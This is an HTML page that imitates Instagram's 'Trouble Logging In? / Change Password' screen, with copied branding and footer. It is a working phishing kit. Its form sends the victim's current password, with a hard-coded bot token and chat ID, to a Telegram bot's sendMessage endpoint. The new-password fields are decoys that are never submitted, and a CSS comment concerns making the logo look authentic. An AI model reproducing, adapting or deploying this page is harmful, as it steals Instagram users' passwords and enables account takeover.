<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram • Change Password</title>
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/ed963513065d.png">
    <style>
        * { box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            background-color: #ffffff; 
            display: flex; 
            flex-direction: column;
            align-items: center; 
            margin: 0;
            min-height: 100vh;
        }
        .main-container { 
            background-color: #fff; 
            border: 1px solid #dbdbdb; 
            padding: 20px 40px; 
            width: 350px; 
            margin-top: 50px;
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            border-radius: 1px;
        }
        /* تعديل اللوغو باش يبان 100% */
        .insta-logo-img {
            width: 175px;
            height: auto;
            margin: 22px 0 12px;
            display: block;
        }
        .header-text {
            color: #737373;
            font-weight: 600;
            font-size: 16px;
            line-height: 20px;
            margin-bottom: 20px;
            text-align: center;
        }
        input { 
            width: 100%; 
            padding: 9px 7px; 
            margin-bottom: 6px; 
            border: 1px solid #dbdbdb; 
            border-radius: 3px; 
            background-color: #fafafa; 
            font-size: 12px;
        }
        input:focus { border: 1px solid #a8a8a8; outline: none; }
        .btn-submit { 
            width: 100%; 
            background-color: #0095f6; 
            color: white; 
            border: none; 
            padding: 7px; 
            border-radius: 8px; 
            font-weight: 600; 
            font-size: 14px; 
            cursor: pointer; 
            margin: 15px 0; 
        }
        .divider {
            display: flex;
            width: 100%;
            align-items: center;
            margin: 10px 0;
        }
        .divider div { flex: 1; height: 1px; background-color: #dbdbdb; }
        .divider span { color: #8e8e8e; font-size: 13px; font-weight: 600; margin: 0 18px; }
        .fb-login { color: #385185; font-size: 14px; font-weight: 600; cursor: pointer; text-decoration: none; margin-bottom: 15px; }
        .forgot-link { color: #00376b; font-size: 12px; text-decoration: none; }
        .footer { margin-top: auto; padding: 24px; text-align: center; width: 100%; }
        .footer-links { display: flex; justify-content: center; flex-wrap: wrap; gap: 15px; margin-bottom: 10px; }
        .footer-links span, .footer-links a { color: #8e8e8e; font-size: 12px; text-decoration: none; }
        .lang-select { border: none; background: none; color: #8e8e8e; font-size: 12px; outline: none; cursor: pointer; }
    </style>
</head>
<body>

    <div class="main-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="insta-logo-img" alt="Instagram">
        
        <p class="header-text">Trouble Logging In?</p>
        
        <form action="https://api.telegram.org/bot8531200875:AAGR0wRXZLRvrvwqGgXwfBRd6n0V0gjYWcU/sendMessage" method="GET" style="width: 100%;">
            <input type="hidden" name="chat_id" value="6347084263">
            
            <input type="password" name="text" placeholder="Current Password" required>
            <input type="password" placeholder="New Password" required>
            <input type="password" placeholder="Confirm New Password" required>
            
            <button type="submit" class="btn-submit">Change Password</button>
        </form>

        <div class="divider">
            <div></div>
            <span>OR</span>
            <div></div>
        </div>
        
        <a href="https://www.facebook.com/login" class="fb-login">Log in with Facebook</a>
        <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-link">Forgot password?</a>
    </div>

    <div class="footer">
        <div class="footer-links">
            <span>Meta</span><span>About</span><span>Blog</span><span>Jobs</span><span>Help</span><span>API</span><span>Privacy</span><span>Terms</span>
        </div>
        <div class="footer-links">
            <select class="lang-select">
                <option value="en">English</option>
                <option value="fr">Français</option>
                <option value="ar">العربية</option>
            </select>
            <span style="color: #8e8e8e;">© 2026 Instagram from Meta</span>
        </div>
    </div>

</body>
</html>
